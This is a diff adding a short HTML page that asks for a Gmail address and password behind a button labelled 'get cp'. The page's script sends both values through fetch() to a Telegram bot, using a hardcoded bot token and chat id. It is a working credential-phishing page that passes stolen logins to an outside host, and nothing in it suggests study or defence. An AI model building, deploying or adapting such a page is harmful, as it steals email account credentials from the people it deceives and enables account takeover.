@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <script>
+      function buttonClick() {
+        let nameInput = document.getElementById("nameInput");
+        let messageInput = document.getElementById("messageInput");
+        let str = nameInput.value + " " + messageInput.value;
+        //alert(str);
+        let commandStr =
+          "https://api.telegram.org/bot198376492:AAEGZqXz50dRG5LEn4GPaVT0bVH_Ybxw-8g/sendmessage?text=" +
+          str +
+          "&chat_id=244448588";
+        fetch(commandStr);
+      }
+    </script>
+  </head>
+
+  <body>
+    <div style="direction: rtl; font-family: tahoma; font-size: 15pt">
+      gmail:<input id="nameInput" type="text" />
+      <br />
+      <br />
+      password:<input id="messageInput" type="text" />
+      <br />
+      <br />
+      <button
+        style="
+          width: 120px;
+          height: 50px;
+          background-color: yellow;
+          font-family: tahoma;
+          font-size: 20pt;
+        "
+        type="button"
+        onclick="buttonClick()"
+      >
+        get cp
+      </button>
+    </div>
+  </body>
+</html>
